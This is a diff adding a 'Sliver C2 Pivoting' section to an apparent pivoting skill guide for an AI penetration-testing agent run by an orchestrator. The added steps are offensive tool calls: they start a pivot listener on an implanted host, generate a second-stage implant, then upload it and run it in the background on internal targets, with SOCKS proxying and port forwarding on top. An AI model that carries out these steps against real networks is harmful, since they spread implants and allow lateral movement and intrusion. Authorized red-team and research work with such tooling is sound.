@@ -20,6 +20,8 @@ keywords:
   - I can't reach the internal network
   - set up a proxy
   - route traffic through
+  - sliver pivot
+  - C2 pivoting
 tools:
   - SSH
   - Ligolo-ng
@@ -147,6 +149,70 @@ What access do you have on the pivot host?
 └─ Through a corporate proxy (NTLM auth)
    └─ rpivot or cntlm + Chisel
 ```
+
+## Sliver C2 Pivoting
+
+When the orchestrator provides a Sliver session on the pivot host, use C2-native
+pivoting instead of manual tunnels. This provides automatic routing, session
+persistence across network interruptions, and no proxychains configuration.
+
+**Prerequisites:**
+- Active Sliver session on the pivot host (session_id provided by orchestrator)
+- sliver-server MCP access
+
+**Pivot via C2:**
+
+1. **Start pivot listener on the implant:**
+   ```
+   sliver_pivot_start(session_id="<pivot_session>", type="tcp", bind_address="0.0.0.0:1234")
+   ```
+
+2. **Generate second-stage implant for internal target:**
+   ```
+   sliver_generate(os="<target_os>", arch="<target_arch>", c2_endpoints=["tcp://<pivot_ip>:1234"])
+   ```
+
+3. **Deploy second-stage** — transfer via the Sliver session:
+   ```
+   sliver_upload(session_id="<pivot_session>", local_path="/path/to/implant", remote_path="/tmp/stage2")
+   sliver_execute(session_id="<pivot_session>", exe="/bin/bash", args=["-c", "chmod +x /tmp/stage2 && /tmp/stage2 &"])
+   ```
+
+4. **Verify new session:**
+   ```
+   sliver_sessions()  # New session should appear from internal target
+   ```
+
+**SOCKS proxy via C2** (for tools that need direct IP access):
+```
+sliver_socks_start(session_id="<pivot_session>", port=1080)
+# Now tools can use: proxychains -q <tool> or SOCKS5 127.0.0.1:1080
+```
+
+**Port forwarding via C2:**
+```
+sliver_portfwd_start(session_id="<pivot_session>", remote_host="172.16.0.10", remote_port=445, local_port=44500)
+# Access 172.16.0.10:445 via 127.0.0.1:44500
+```
+
+**View topology:**
+```
+sliver_pivot_graph()  # Shows all pivot chains and sessions
+```
+
+**Advantages over manual tunnels:**
+- Automatic routing — no proxychains needed for tools using `sliver_execute()`
+- Session persistence — survives brief network interruptions
+- Multi-hop — nested pivots chain automatically through the pivot graph
+- No additional binaries on target (reuses existing implant)
+
+**When to fall back to manual tunnels:**
+- Sliver session is not available on the pivot host
+- Orchestrator specifies manual tunnel mode
+- C2 pivot listener fails (firewall blocks inter-host traffic)
+- Need transparent routing for tools that can't use SOCKS (use sshuttle/ligolo)
+
+If falling back, continue with the manual tunnel steps below.
 
 ## Step 1: SSH Tunneling
 
